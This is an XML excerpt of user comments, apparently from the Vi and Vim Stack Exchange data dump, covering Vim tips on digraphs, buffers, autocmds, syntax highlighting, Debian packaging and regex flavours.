  <row Id="1856" PostId="2211" Score="0" Text="@jamessan I admit I saw the original autocmd and zoned out. On an unrelated note: the fnameescape might be the solution to another question here, about gvim and remote send." CreationDate="2015-02-25T16:28:50.170" UserId="205" />
  <row Id="1857" PostId="2203" Score="0" Text="+1; it should be possible to open a gazillion buffers in Vim at the same time and still be good. As long as you're not viewing the buffer (in a window, or &quot;tab&quot;) it's not loaded in memory." CreationDate="2015-02-25T16:30:15.723" UserId="51" />
  <row Id="1858" PostId="2170" Score="0" Text="If you're using Vim-LaTeX/LaTeX-Squite, press F5." CreationDate="2015-02-25T16:32:57.023" UserId="142" />
  <row Id="1859" PostId="2203" Score="0" Text="@Carpetsmoker, buffer variables and settings do not disappear when the buffer is not displayed in a window. If a plugin stores a lot of information for each buffer, as Peter suggested, then memory could be wasted (considering the end-user won't do anything more with the buffer). BTW: A plugin may not store data related to buffers in `b:variables` but in a `s:plugin[bufid]` if the plugin maintainer preferred to not pollute the public `b:` _&quot;namespace&quot;_. In this case, deleting the buffer won't necessarily collect all related variables/memory." CreationDate="2015-02-25T16:41:10.370" UserId="626" />
  <row Id="1860" PostId="2205" Score="0" Text="whoops, I'll revise my comment. Should have read the docs more closely." CreationDate="2015-02-25T16:50:52.550" UserId="680" />
  <row Id="1861" PostId="1940" Score="0" Text="I would not recommend using a separate vimrc file, for the simple reason that it's so easy to forget. Something like this autocmd: `au BufRead * if &amp;key != &quot;&quot; | setlocal nobackup noundofile ... | endif` should do the magic for you, and it's impossible to forget." CreationDate="2015-02-25T16:52:45.087" UserId="51" />
  <row Id="1862" PostId="2192" Score="1" Text="Note that if this new buffer is meant to be temporary, you may want to make it a scratch buffer by doing `setlocal buftype=nofile bufhidden=hide noswapfile`. Among other things, this lets you quit vim without saving/deleting that buffer. If you do this regularly, I'd suggest making a keyboard shortcut or getting one of the &quot;scratch&quot; plugins." CreationDate="2015-02-25T17:24:03.810" UserId="680" />
  <row Id="1863" PostId="2210" Score="0" Text="Thanks for this answer. I accepted it instead of the initial answer given by @Rich because it seemed more complete. I will try it out but not sure if I will be using it because of all the side effects so no promise here :) Big Thank You for all the effort!" CreationDate="2015-02-25T17:43:27.823" UserId="307" />
  <row Id="1864" PostId="2210" Score="1" Text="@KarolisKoncevičius Thanks. I added it to my vimrc aswell. It seems nice :-) Let me know if you encounter problems." CreationDate="2015-02-25T18:00:38.147" UserId="51" />
  <row Id="1865" PostId="2201" Score="2" Text="To arrive at this answer: hex 2013 is decimal 8211. Use the [`:digraphs`](https://vimhelp.appspot.com/digraph.txt.html) command to display all digraphs, and look for 8211." CreationDate="2015-02-25T18:04:33.367" UserId="24" />
  <row Id="1866" PostId="2199" Score="0" Text="Perhaps not the *easiest* way, but I tend to use `&lt;Ctrl-Shift-U&gt;2013&lt;Space&gt;` because it works everywhere. A few key codes go a long way (I mainly use U+2013, U+2014, U+2026, U+2212, U+2192, U+B0; –/—/…/−/→/°)." CreationDate="2015-02-25T18:08:53.583" UserId="142" />
  <row Id="1867" PostId="2199" Score="0" Text="Out of curiosity, how do you *display* en dashes? AFAIK, there is no way to display non-fixed-width fonts properly (i.e. with non-uniform character widths and kerning), so em- and en-dashes always look exactly like hyphens that extend to the extreme edge of the character boundary. Do you just not mind having an extreme disconnect between how the character is displayed in Vim and how it's rendered elsewhere?" CreationDate="2015-02-25T18:45:15.690" UserId="1060" />
  <row Id="1868" PostId="2199" Score="0" Text="For future reference, `:h digraph-table` will bring you to something a little more useful than `:digraphs`. In particular, `:h digraph-table` followed by `/dash` (assuming you're using smartcase) or `/\cdash` (if you're not) will bring you right to em- and en- dashes." CreationDate="2015-02-25T18:51:11.367" UserId="1062" />
  <row Id="1869" PostId="2220" Score="0" Text="Note: `plugin-gundo` would be a good tag for this question, but unfortunately that tag doesn't exist yet, and I have no rep." CreationDate="2015-02-25T19:22:00.280" UserId="1060" />
  <row Id="1870" PostId="2086" Score="0" Text="Would you mind expanding a bit on what you mean by &quot;support excluding...&quot;? Do you mean that you'd like to show a list of all files except some matching a pattern, or that you'd like to exclude certain files from *ever* showing up in the list? (The latter option is what @muru's answer with `autocmd` does; the former seems like it would be more useful and possibly easier to achieve.)" CreationDate="2015-02-25T19:29:44.677" UserId="1060" />
  <row Id="1871" PostId="2087" Score="0" Text="That's an awesome feature that I'd never heard of." CreationDate="2015-02-25T19:30:01.040" UserId="1060" />
  <row Id="1872" PostId="2219" Score="0" Text="What is the value of `c_no_cformat`?" CreationDate="2015-02-25T19:39:10.363" UserId="72" />
  <row Id="1873" PostId="2204" Score="2" Text="`Alt+-` (or rather `Option+-` to be pedantic) is a Mac-specific shortcut. It works everywhere in OS X, but is not related to vi or vim." CreationDate="2015-02-25T19:52:46.750" UserId="1064" />
  <row Id="1874" PostId="2221" Score="0" Text="I tried `:let c_no_cformat = 0`; is that what you meant by setting it to false? It apparently had no effect." CreationDate="2015-02-25T19:55:50.510" UserId="1060" />
  <row Id="1875" PostId="2219" Score="0" Text="@JoshPetrie It's undefined when I launch with `-u -NONE` and then turn on syntax." CreationDate="2015-02-25T19:56:47.003" UserId="1060" />
  <row Id="1876" PostId="2220" Score="1" Text="There's also [undotree](https://github.com/mbbill/undotree). I don't know how exactly it's different from gundo, or if it supports the feature you want, but you could check it out." CreationDate="2015-02-25T20:00:12.687" UserId="51" />
  <row Id="1877" PostId="2221" Score="0" Text="No, use unlet (per the docs, see :help ft-c-syntax) and then reload the file." CreationDate="2015-02-25T20:01:36.890" UserId="72" />
  <row Id="1878" PostId="2221" Score="0" Text="I get &quot;no such variable&quot; (consistent with my previous comment that it's undefined)." CreationDate="2015-02-25T20:04:26.610" UserId="1060" />
  <row Id="1879" PostId="2221" Score="0" Text="Well, that's obnoxious. I can definitely reproduce your behavior and then fix it that way, and it's consistent with the vim_dev thread I linked. It's possible your runtime files differ from mine (I'm on Windows, using gVim) in such a way as to also affect the way the syntax file evaluates." CreationDate="2015-02-25T20:08:23.553" UserId="72" />
  <row Id="1880" PostId="2221" Score="0" Text="There are certainly some compilation differences across platforms at work; note that in the answer on my original SuperUser question, IngoKarkat was unable to reproduce the issue." CreationDate="2015-02-25T20:11:09.223" UserId="1060" />
  <row Id="1881" PostId="2221" Score="0" Text="If you drop in to the [chat] we may be able to work out what the difference is. My guess is you have the patch that &quot;broke&quot; this as pointed out on vim_dev, and I don't." CreationDate="2015-02-25T20:30:05.013" UserId="72" />
  <row Id="1882" PostId="2221" Score="0" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/21448/discussion-between-kyle-strand-and-josh-petrie)." CreationDate="2015-02-25T20:48:38.540" UserId="1060" />
  <row Id="1883" PostId="2223" Score="0" Text="I get the same error on my Linux system, so it doesn't seem to be Windows-specific behaviour" CreationDate="2015-02-25T21:14:41.440" UserId="51" />
  <row Id="1885" PostId="2224" Score="0" Text="That does the trick. Too bad I can't +2 for linking to the documentation question." CreationDate="2015-02-25T21:27:38.023" UserId="475" />
  <row Id="1886" PostId="2224" Score="0" Text="@Roflo I can't take any credit for that post, that's all *romainl*'s work :-)" CreationDate="2015-02-25T21:30:57.237" UserId="51" />
  <row Id="1887" PostId="2210" Score="0" Text="Hahaha. Well I think this qualifies as hacky, but it's not as horrible as I expected. Nice job. Of, course, now that you've gone this far, don't you feel compelled to fix the problems with j, k, $, etc. by remapping them, and to remove the white space before yanking? ;)" CreationDate="2015-02-25T21:32:46.673" UserId="343" />
  <row Id="1888" PostId="2210" Score="2" Text="@Rich Yeah, it's a hack. That made it fun to do ;-) Fixing some of the keys (somehow) crossed my mind as well, but I already spent quite a bit of time on this, and want to first see if it actually works at all, and if I even like it, before spending even more time on it :-)" CreationDate="2015-02-25T21:34:57.440" UserId="51" />
  <row Id="1889" PostId="2202" Score="0" Text="The en dash digraph is built in." CreationDate="2015-02-25T21:39:38.423" UserId="24" />
  <row Id="1890" PostId="2227" Score="0" Text="Is it also possible to disable just the `autocmd`/`augroup` as defined by the zip plugin? I like this (+1), but if you for example have an `autocmd` to disable syntax highlight and such for large files (as is common), then you will *also* disable that as a side-effect..." CreationDate="2015-02-25T21:43:52.093" UserId="51" />
  <row Id="1891" PostId="2227" Score="0" Text="@Carpetsmoker Not temporarily.  If you know the group name (in this case &quot;zip&quot;), you can undefine all of the autocmds defined in that group with `augroup zip | exe 'au!' | augroup END`." CreationDate="2015-02-25T21:47:56.560" UserId="15" />
  <row Id="1892" PostId="2202" Score="1" Text="@200_success I didn't say it wasn't. :) Vim's digraph choices don't always align with more standard ones, so knowing how to define your own digraph is useful, even if one already exists." CreationDate="2015-02-25T21:49:29.727" UserId="15" />
  <row Id="1893" PostId="2204" Score="1" Text="Works in MacVim, but in Terminal vim it acts like [Esc] followed by `-`, thus switching to Normal mode and putting the cursor at the beginning of the previous line." CreationDate="2015-02-25T21:51:28.663" UserId="24" />
  <row Id="1894" PostId="2228" Score="0" Text="Is there some automated way of distributing the regex like that? It provides such a clear depiction." CreationDate="2015-02-25T22:14:36.047" UserId="205" />
  <row Id="1895" PostId="2228" Score="1" Text="I've been doing it by hand. The easiest quick way in vim would be to do something like `yy10p` on the line with the full regex then select parts you wish to remove and hit `r&lt;space&gt;`. Maybe I'll add a command for 'replace everything except the selection on this line with spaces' to speed things up a bit." CreationDate="2015-02-25T22:21:01.600" UserId="680" />
  <row Id="1896" PostId="2228" Score="0" Text="Wow! That is quite some effort!" CreationDate="2015-02-25T22:21:34.887" UserId="205" />
  <row Id="1897" PostId="2223" Score="1" Text="Just out of curiosity, why are you doing your checksums/hex from within vim?" CreationDate="2015-02-25T22:22:20.757" UserId="880" />
  <row Id="1898" PostId="2230" Score="1" Text="This seems very opinion-based ... You're not really asking anything, except &quot;which of these 3 solutions is considered the best&quot; (since the last 2 are considered too &quot;long&quot; or &quot;lame&quot;)..." CreationDate="2015-02-25T22:32:44.137" UserId="51" />
  <row Id="1899" PostId="2230" Score="0" Text="My point really is: is there a best practice (or a plugin) for precise vertical movement? Horizontal movement is pretty easy: `f`, `t`" CreationDate="2015-02-25T22:46:54.837" UserId="1056" />
  <row Id="1900" PostId="2230" Score="3" Text="&quot;So, what do you guys use?&quot; is more of a poll than a real question." CreationDate="2015-02-25T22:48:12.110" UserId="88" />
  <row Id="1901" PostId="2231" Score="0" Text="&quot;This means the Vim packaging can't specify a hard dependency on a minimum version of a library.&quot; I assume that's why Debian doesn't have separate packages for Vim+Python2 and Vim+Python3 the way Arch Linux has?" CreationDate="2015-02-25T22:49:06.880" UserId="205" />
  <row Id="1904" PostId="2234" Score="0" Text="It's an independent program that is run from the command line, and it's installed independently from vim (I've seen it in several Linux distributions that didn't install vim by default). That's a UNIX command tool for me :-P" CreationDate="2015-02-25T23:53:34.133" UserId="403" />
  <row Id="1906" PostId="2234" Score="0" Text="Rephrased it to &quot;command line tool&quot; ;-)" CreationDate="2015-02-26T00:04:48.350" UserId="403" />
  <row Id="1907" PostId="2222" Score="0" Text="Similar post: [Folding by regex search pattern](http://vi.stackexchange.com/q/2165/778)" CreationDate="2015-02-26T00:13:26.927" UserId="778" />
  <row Id="1908" PostId="2230" Score="1" Text="What do you mean by &quot;precise vertical movement&quot;? You're describing moving to a different column as well as a different row; that's not precisely &quot;vertical.&quot; It sounds like you're just asking &quot;how do I perform an arbitrary movement in Vim&quot; without noticing that (to give an off-the-cuff estimate) 90% of Vim keystrokes are movement-related." CreationDate="2015-02-26T00:21:12.507" UserId="1060" />
  <row Id="1909" PostId="2238" Score="0" Text="Why two `&lt;esc&gt;`s? You only need one." CreationDate="2015-02-26T00:51:47.823" UserId="88" />
  <row Id="1910" PostId="2238" Score="0" Text="Oops, I was just getting mixed up because of the delay for vim to respond.  I'll edit the question." CreationDate="2015-02-26T00:56:14.787" UserId="141" />
  <row Id="1911" PostId="2238" Score="1" Text="I can only suggest `)gE`. I know you said you always end sentences with a period, but it's better to not even have to assume that." CreationDate="2015-02-26T01:35:52.873" UserId="195" />
  <row Id="1912" PostId="2238" Score="0" Text="Also note that `as` and `is` do not only work in visual mode. You can do `das` in normal mode to Delete A Sentence." CreationDate="2015-02-26T01:39:36.923" UserId="195" />
  <row Id="1913" PostId="2231" Score="0" Text="@muru Python is only one of the language bindings available.  Providing combinations of packages for the different languages and GUI toolkits is a large number of packages.  The decision was to enable as many language bindings as was reasonable and let the choice be among GUI toolkits (or not).  A user shouldn't have to choose Vim plugins based on the language they're written in." CreationDate="2015-02-26T02:23:55.203" UserId="15" />
  <row Id="1914" PostId="2231" Score="0" Text="That is not a real argument, since only Python and Python3 conflict each other. I honestly think you should borrow a leaf from the Arch developers' book. Aside from a common `vim-runtime` package, they have `vim`, `gvim`, `vim-python3` and `gvim-python3`. The only difference between the `-python3` and the normal packages is the version of Python enabled. Sure, it doubles the number of frontend packages, but that's all the flaw I see in such packaging." CreationDate="2015-02-26T02:55:55.050" UserId="205" />
  <row Id="1915" PostId="2231" Score="0" Text="That's for Arch.  In Debian, there's `vim-nox`, `vim-gtk`, `vim-gnome`, and `vim-athena`.  Doubling those just so that users still can't use both Python and Python3 plugins doesn't seem worthwhile." CreationDate="2015-02-26T03:07:27.343" UserId="15" />
  <row Id="1917" PostId="801" Score="0" Text="Sort of a dupe, but the other qu. is more about *nix than Windows" CreationDate="2015-02-26T03:24:52.540" UserId="398" />
  <row Id="1919" PostId="2199" Score="0" Text="@WChargin it works only in GTK applications, which is far from everywhere." CreationDate="2015-02-26T04:33:19.717" UserId="1081" />
  <row Id="1920" PostId="2199" Score="0" Text="@Ruslan True, but it's everywhere for me! `:D` I've heard that it's bad practice to mix GTK and KDE anyway. It's Not Perfect, But It Works.™" CreationDate="2015-02-26T05:39:06.533" UserId="142" />
  <row Id="1921" PostId="2199" Score="0" Text="@WChargin it's a normal practice. You don't have to be devoted to a particular toolkit — just use the apps which work." CreationDate="2015-02-26T06:04:07.937" UserId="1081" />
  <row Id="1922" PostId="2236" Score="0" Text="This is the answer I was hoping for. Thank you!" CreationDate="2015-02-26T06:45:08.417" UserId="1056" />
  <row Id="1923" PostId="2086" Score="0" Text="@KyleStrand I was thinking of the first variant, excluding a file if the path matches one of a list of patterns. For example, the patterns could be something like `*.tmp,/tmp/*,/mnt/foo/*`." CreationDate="2015-02-26T07:26:28.927" UserId="925" />
  <row Id="1924" PostId="429" Score="3" Text="Someone would have to be *really* crazy to write a script like that." CreationDate="2015-02-26T08:04:49.033" UserId="630" />
  <row Id="1925" PostId="2210" Score="1" Text="@Carpetsmoker Well the last time I vaguely hinted that something might be possible you went away and made it, so I look forward to seeing your robust multi-language solution in another couple of weeks." CreationDate="2015-02-26T08:14:48.480" UserId="343" />
  <row Id="1926" PostId="2199" Score="2" Text="I am with @Carpetsmoker: `Compose` `-` `-` `-` for a em-dash, `Compose` `-` `-` `.` for a en-dash. Compose is magical, especially if you map it to the otherwise totally unused Caps-Lock." CreationDate="2015-02-26T09:24:38.740" UserId="854" />
  <row Id="1927" PostId="2243" Score="0" Text="This probably explains why I wasn't able to reproduce the issue." CreationDate="2015-02-26T10:08:01.650" UserId="51" />
  <row Id="1928" PostId="2221" Score="1" Text="`cCppOut2 comes from c.vim (oddly enough):`. Seems legit to have this in C provided that &quot;Cpp&quot; stands for `C PreProcessor` in this context." CreationDate="2015-02-26T10:24:22.730" UserId="860" />
  <row Id="1929" PostId="476" Score="0" Text="Rather than using `tee` then throwing away its output, wouldn't `cat` also work if you don't want the file printed out?" CreationDate="2015-02-26T11:08:25.233" UserId="632" />
  <row Id="1930" PostId="2206" Score="0" Text="Hmm. `keepalt file` has the same drawback as assigning to `vim.current.buffer.name` - vim warns you that the file already exists when try to save your changes." CreationDate="2015-02-26T11:29:57.823" UserId="205" />
  <row Id="1931" PostId="2244" Score="1" Text="I think you use `v&lt;Esc&gt;d50j`?" CreationDate="2015-02-26T11:59:42.213" UserId="51" />
  <row Id="1933" PostId="2245" Score="0" Text="This is [cross-posted from stackoverflow](http://stackoverflow.com/q/26115471/4063051). The only reason I don't delete the post there is to have it more easily foundable via google search." CreationDate="2015-02-26T13:09:20.827" UserId="602" />
  <row Id="1935" PostId="2223" Score="0" Text="@Random832 on this occasion, just because it's the first thing that came to my mind. Most other times, because I can checksum a [range](http://vim.wikia.com/wiki/Ranges) instead of the whole file, and hex because I can switch back and forth with raw." CreationDate="2015-02-26T14:52:24.823" UserId="475" />
  <row Id="1936" PostId="2243" Score="2" Text="Unfortunately, the version of Vim that's in Debian's wheezy-backports (and will be in jessie) doesn't have the fix for this.  I'll upload a fixed version to jessie-backports once jessie is released, but not much else that can be done." CreationDate="2015-02-26T15:23:33.703" UserId="15" />
  <row Id="1937" PostId="2239" Score="1" Text="This has driven me nuts for years!" CreationDate="2015-02-26T15:43:22.590" UserId="989" />
  <row Id="1938" PostId="2241" Score="2" Text="Sorry, I should've been more clear. This has nothing to do with insert mode. I use hard tabs and each hard tab takes up four spaces. When I move the cursor (normal mode) onto a hard tab character it ends up on the right-most column of the tab. I want it to be at the left-most column of the tab. This is purely a aesthetic issue." CreationDate="2015-02-26T15:53:41.880" UserId="200" />
  <row Id="1939" PostId="2242" Score="1" Text="Thank you! You helped me look in the right place. `:set list listchars=tab:\ \ ` results in what I asked for. Now I just need to see if it's as useful as I thought!" CreationDate="2015-02-26T15:59:34.170" UserId="200" />
  <row Id="1940" PostId="2244" Score="0" Text="Thanks, I had indeed written it incorrectly.  Actually I start with `V` if I know I will be doing a line-wise operation, and then I can leave the `d` until last, for greater confidence." CreationDate="2015-02-26T16:18:56.403" UserId="630" />
  <row Id="1942" PostId="2247" Score="0" Text="&lt;C-^&gt; alone (&lt;C-6&gt; in my case, as  Peter Rincker suggested) is a good trick in case of just 2 buffers :-)" CreationDate="2015-02-26T16:50:12.883" UserId="983" />
  <row Id="1945" PostId="2087" Score="0" Text="Might it be possible to combine the `browse` command with [`unite`](https://github.com/Shougo/unite.vim) and/or [`PipeCmd`](https://github.com/joeytwiddle/rc_files/blob/c8264794527c6be685829f08f63fd8dfa2903528/.vim/plugin/joeycommands.vim#L112-131) to achieve the filtering that OP would like?" CreationDate="2015-02-26T18:33:43.020" UserId="1060" />
  <row Id="1946" PostId="2087" Score="0" Text="@KyleStrand I have never used either, so I don't know." CreationDate="2015-02-26T18:37:35.033" UserId="205" />
  <row Id="1947" PostId="2228" Score="1" Text="I made a (really ugly) vim function to make this a bit faster: https://gist.github.com/mattboehm/da63a48eedf6f14375aa . Select a line, hit `,r` then join lines together with `&lt;space&gt;` in normal/visual mode." CreationDate="2015-02-26T18:42:04.273" UserId="680" />
  <row Id="1948" PostId="2250" Score="1" Text="Hm. Since doing a search-and-replace can make the word(s) being replaced completely invisible to `changes`, that's not terribly useful. What I'd really like is to be able to do `:%s/foo/bar/g`, then do a search for `foo` that would (reconstruct and) show me the last version of the file in which `foo` was present." CreationDate="2015-02-26T18:42:27.627" UserId="1060" />
  <row Id="1949" PostId="2243" Score="0" Text="Yes, this would be appreciated. Also for bug [774492](https://bugs.debian.org/774492) which I understand can be very disturbing for people." CreationDate="2015-02-26T19:57:14.110" UserId="71" />
  <row Id="1950" PostId="2245" Score="0" Text="Have you tried using `:inoreab`?!" CreationDate="2015-02-26T20:13:55.130" UserId="970" />
  <row Id="1951" PostId="1979" Score="0" Text="@Carpetsmoker: Yes, thus my comment *“… does not handle background processes as in `foo &amp;` …”*. From the Q text as a whole I interpreted it as being either or. Either *“Execute as external command AKA background”* or *“Execute as external command _and_ as background process.”*. I answered mainly based on the title of Q etc. – and added a comment on *“Not sure …”* – and left it to OP to clarify if either or." CreationDate="2015-02-26T20:30:37.493" UserId="220" />
  <row Id="1952" PostId="2249" Score="1" Text="Vim doesn't have autocomplete.  Are you using a plugin or are you referring to one of the [ins-completion](http://vimhelp.appspot.com/insert.txt.html#ins-completion) commands?" CreationDate="2015-02-26T20:42:29.177" UserId="15" />
  <row Id="1953" PostId="2229" Score="0" Text="I gave this answer the tick because to me its how to do the highlighting that I needed (as expressed by the question). @Matts regular expression nice but does not answer the actual question I asked (changing the highlighting)." CreationDate="2015-02-26T21:44:51.140" UserId="383" />
  <row Id="1955" PostId="2254" Score="0" Text="The other question is really a &quot;special case&quot; of this more generic question; the answers will be the same... My comment there also applies: Use you OS' facilities (whatever they may be), or some other OS-wide program (for examplle when I used Windows, I liked to use AllChars which emulates X11's Compose key; it works in all programs)." CreationDate="2015-02-26T21:55:09.293" UserId="51" />
  <row Id="1956" PostId="2254" Score="0" Text="Yes that is a special case and the answers are specialized for it. Do you not think there may be a more generalized solution that encompases more things that people did not consider when looking at the special case." CreationDate="2015-02-26T21:57:18.160" UserId="383" />
  <row Id="1957" PostId="2254" Score="0" Text="We could also make that question more generic, or mark that one a dupe of this one (even though it was earlier); I don't really care *as such*. But I don't think that having both questions as it is will help anyone in the long term :-)" CreationDate="2015-02-26T21:59:05.543" UserId="51" />
  <row Id="1958" PostId="2254" Score="0" Text="If I could control the world. Maybe we should let it stand for a day or two so if it gathered any unique responses that could distinguish it from the other question. If it remains unanswered or the answers are just duplicates then close/delete it." CreationDate="2015-02-26T22:09:30.963" UserId="383" />
  <row Id="1960" PostId="2254" Score="0" Text="All right .. I definitely agree the other question doesn't have *great* answers, and this question should attract better ones (hopefully) ... Editing the other question (to make it more generic) still leaves it with a bunch of highly upvoted answers that deal *only* with the em dash, so that's not great either ... So I've retracted my close vote, and as soon as this gets some decent answers I'll vote the other oone a dupe of this one (even though it was earlier)... I of course can't control what other people choose to vote." CreationDate="2015-02-26T22:17:32.663" UserId="51" />
  <row Id="1961" PostId="2254" Score="0" Text="@Carpetsmoker: If we had a mod then they have the power to combine questions I believe which is another options. We could as a group potentially edit the questions together if that made sense in the long run." CreationDate="2015-02-26T22:33:31.823" UserId="383" />
  <row Id="1962" PostId="2256" Score="1" Text="For Windows, use [Wincompose](https://github.com/samhocevar/wincompose) instead of Allchars. It does exactly what it says on the tin. I used Allchars until I found Wincompose. The limitation of compose is that you can't have a memorable combination to reach all characters, only the ones that you use often or that have a logical decomposition." CreationDate="2015-02-27T00:28:34.067" UserId="8" />
  <row Id="1963" PostId="2256" Score="0" Text="@Gilles Thanks; WinCompose looks nice. You're right that you can only enter a fairly limited subset of &quot;most used&quot; characters. For me this is enough &gt;95% of the time. For the rest I use [UniView](http://rishida.net/uniview/)... I'm not aware of anything significantly better..." CreationDate="2015-02-27T00:38:08.620" UserId="51" />
  <row Id="1964" PostId="2199" Score="0" Text="possible duplicate of [What is the easiest way to insert unicode characters into a document?](http://vi.stackexchange.com/questions/2254/what-is-the-easiest-way-to-insert-unicode-characters-into-a-document)" CreationDate="2015-02-27T00:38:51.963" UserId="51" />
  <row Id="1965" PostId="1959" Score="1" Text="This sounds like something that one InsertEnter/InsertLeave autocmd to toggle relative line numbering could do. Am I missing something?" CreationDate="2015-02-27T01:16:26.423" UserId="1094" />
  <row Id="1966" PostId="2256" Score="0" Text="For rarely-used characters, I use [Shapecatcher](http://shapecatcher.com/) (no editor integration that I know of) or I type the character name (`C-x 8 RET` in an editor that isn't vi, I don't know if Vim has something similar)." CreationDate="2015-02-27T02:16:43.667" UserId="8" />
  <row Id="1967" PostId="2249" Score="0" Text="When in insert mode I press CTRL-X CTRL-K I get a drop down list of all the possible words that could complete the fragment typed so far. Perhaps the function has a different name, but the function is there, and pulls the words from the current dictionary. I would like to pull the words from a list, if the first character is the @ sign. Any help would be appreciated." CreationDate="2015-02-27T06:59:27.830" UserId="1095" />
  <row Id="1968" PostId="2256" Score="0" Text="KDE users cannot use this method as [KDE relegates responsibility for implementing this feature to Xorg](https://bugs.kde.org/show_bug.cgi?id=103788), and [Xorg relegates to Qt](https://bugs.freedesktop.org/show_bug.cgi?id=26747), and [Qt relegates back to Xorg](http://bugreports.qt.nokia.com/browse/QTBUG-8). I discuss this on my page about [typing RTL text](http://dotancohen.com/howto/rtl_right_to_left.html)." CreationDate="2015-02-27T08:57:34.117" UserId="989" />
  <row Id="1970" PostId="2245" Score="0" Text="@IngoKarkat I just tried, and the result is very weird. See the edit" CreationDate="2015-02-27T09:15:35.253" UserId="602" />
  <row Id="1971" PostId="2252" Score="0" Text="you might want to use the `a` and `s` for embedded blocks (loops and so)" CreationDate="2015-02-27T09:55:32.210" UserId="342" />
  <row Id="1972" PostId="2252" Score="0" Text="@elyashiv I don't understand what you mean?" CreationDate="2015-02-27T09:56:55.920" UserId="51" />
  <row Id="1973" PostId="2259" Score="0" Text="thanks for the very useful answer. I [submitted](http://sourceforge.net/p/vim-latex/mailman/vim-latex-devel/?viewmonth=201502) this problem on the [developers](http://sourceforge.net/p/vim-latex/mailman/vim-latex-devel/) mailing list. Let's see if they confirm and possibly fix the issue." CreationDate="2015-02-27T11:16:38.200" UserId="602" />
  <row Id="1976" PostId="2261" Score="0" Text="One thing that I do with many of my source files is put one line at the top: `Copyright © ...; see below for full copyright`, and then put the license at the bottom of the file ([like this](http://code.arp242.net/pkg_clearleaves/src/8f509bae419815748a53d815ac77b45413b559b7/pkg_clearleaves?at=default)). I have no idea if this is an option for your PHB, but you could try suggesting it.." CreationDate="2015-02-27T13:21:24.013" UserId="51" />
  <row Id="1977" PostId="2261" Score="0" Text="Another way is to add/remove indentation with `autocmd` on `BufReadPost` and `BufWritePre`... I don't know what  your file looks like exactly, so I can't give you a ready-made function" CreationDate="2015-02-27T13:24:30.657" UserId="51" />
  <row Id="1978" PostId="2260" Score="1" Text="Here's a different idea: You have the `InsertEnter` and `InsertLeave` autocmds, which you can use to switch layouts automatically. Specifically, on  the `InsertLeave` you can check if it's Turkish, if it is, switch to Dvorak, set a flag, and when you enter insert again switch back to Turkish if that was the case last time you left insert mode." CreationDate="2015-02-27T13:33:45.737" UserId="51" />
  <row Id="1979" PostId="2256" Score="0" Text="@dotancohen That looks like a different issue (as in, feature request)." CreationDate="2015-02-27T14:56:18.213" UserId="51" />
  <row Id="1980" PostId="2249" Score="0" Text="If you never normally use CTRL-X CTRL-K, you could change the `'dictionary'` option to point to a different file. Alternatively you could turn your tags into vim tags and use CTRL-X CTRL-T or write a user-defined completion function and use CTRL-X CTRL-U. Both of these would be harder to do, though." CreationDate="2015-02-27T15:01:42.080" UserId="680" />
  <row Id="1981" PostId="2265" Score="0" Text="Thank you! Using Backslashes on the parenthesis helped." CreationDate="2015-02-27T15:13:25.463" UserId="826" />
  <row Id="1982" PostId="2256" Score="0" Text="*Make it work in GTK &amp; Qt* I put that code into `~/.gnomerc`. Probably in could be also in `~/.xsessionrc`." CreationDate="2015-02-27T15:57:41.177" UserId="739" />
  <row Id="1983" PostId="2268" Score="3" Text="Pretty sure `\v` includes `&lt;&gt;` word boundaries, which AFAIK is unique to Vim. So no, just describe them as &quot;Vim regex.&quot; (Not posting as an answer because I'm not positive)" CreationDate="2015-02-27T16:50:17.970" UserId="88" />
  <row Id="1984" PostId="346" Score="0" Text="Wikipedia claims nvi is based on elvis which shipped with the original 386BSD, and was an effort to make a more purely vi-compatible version. Is this correct?" CreationDate="2015-02-27T17:06:15.540" UserId="880" />
  <row Id="1985" PostId="473" Score="0" Text="IIRC you can use the `:gui` command (within `has(&quot;gui_running&quot;)`, of course) to force the gui startup sequence to happen before any subsequent .vimrc commands. My .vimrc uses this to allow the default background light/dark setting to be set based on the actual GUI background color." CreationDate="2015-02-27T18:20:56.247" UserId="880" />
  <row Id="1986" PostId="2270" Score="0" Text="I don't think &quot;very&quot; mode existed in vi. And `\V` seem to have been created explicitly because nomagic/`\M` does not do this." CreationDate="2015-02-27T18:48:30.643" UserId="880" />
  <row Id="1987" PostId="2270" Score="0" Text="Correct, I'll edit my query to mention that this is vim-specific" CreationDate="2015-02-27T18:49:20.287" UserId="680" />
  <row Id="1989" PostId="2271" Score="0" Text="Thanks for writing this up! When the pdf manual I found didn't format text correctly, I gave up on quoting it directly without thinking to just search for another version" CreationDate="2015-02-27T19:35:57.323" UserId="680" />
  <row Id="1990" PostId="2271" Score="0" Text="@MattBoehm Firefox's built-in PDF viewer has problems with copy and paste in my experience; have you tried opening it in Acrobat Reader? And I formatted this by hand from the source; I didn't see the PDF you found." CreationDate="2015-02-27T19:36:52.923" UserId="880" />
  <row Id="1991" PostId="2271" Score="0" Text="Things were messed up enough that I think the PDF was generated from an OCR scan, but I'll try acrobat in the future." CreationDate="2015-02-27T19:38:12.120" UserId="680" />
  <row Id="1992" PostId="2261" Score="0" Text="Of course you could always go the lazy route and indent your legalese ;)" CreationDate="2015-02-27T19:47:28.417" UserId="680" />
  <row Id="1993" PostId="2260" Score="0" Text="@Carpetsmoker I don't see how that fixes my issues. Even if there was something to &quot;check&quot; (I'm not sure what you think I'd be checking there...part of the problem is I go back and forth on a word by word basis), one of the reasons I was thinking along the lines of `:imap` is that it would work even in a remote ssh session or when `$DISPLAY` is otherwise not set." CreationDate="2015-02-27T20:07:05.910" UserId="267" />
  <row Id="1994" PostId="429" Score="0" Text="Why doesn't a syntax element containing a newline higlight to the end of the line?" CreationDate="2015-02-27T21:27:45.733" UserId="880" />
  <row Id="1995" PostId="2210" Score="0" Text="Your answer has a bunch of spaces at the ends of lines... I assume you edited it in vim, and copied to clipboard rather than writing it to a file." CreationDate="2015-02-27T21:29:10.770" UserId="880" />
  <row Id="1996" PostId="88" Score="1" Text="You may also want to also [set display=lastline](http://vi.stackexchange.com/questions/102/show-partially-hidden-wrapped-lines) to avoid blank @ lines at the end of the screen." CreationDate="2015-02-27T22:07:11.917" UserId="880" />
  <row Id="1997" PostId="2274" Score="1" Text="This effectively just asks for a list of platforms and their default Vi flavours. I don't think this is a very good question for the SE format to be honest..." CreationDate="2015-02-27T23:01:50.290" UserId="51" />
  <row Id="1998" PostId="2274" Score="1" Text="I'm asking about the existence of other vi flavors other than the most well known ones." CreationDate="2015-02-27T23:59:04.580" UserId="880" />
